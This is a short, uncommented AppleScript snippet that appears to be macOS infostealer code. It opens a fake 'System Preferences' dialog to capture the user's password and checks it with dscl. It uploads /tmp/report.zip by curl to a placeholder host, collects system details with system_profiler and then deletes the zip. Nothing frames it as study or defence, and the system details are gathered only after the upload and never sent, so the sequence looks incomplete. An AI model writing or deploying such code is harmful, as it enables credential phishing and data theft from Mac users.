set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
do shell script "dscl . authonly user " & quoted form of secret
do shell script "curl -X POST -H \"buildid: test-build\" --data-binary @/tmp/report.zip https://example.invalid/upload"
set hardware to do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType"
do shell script "rm /tmp/report.zip"
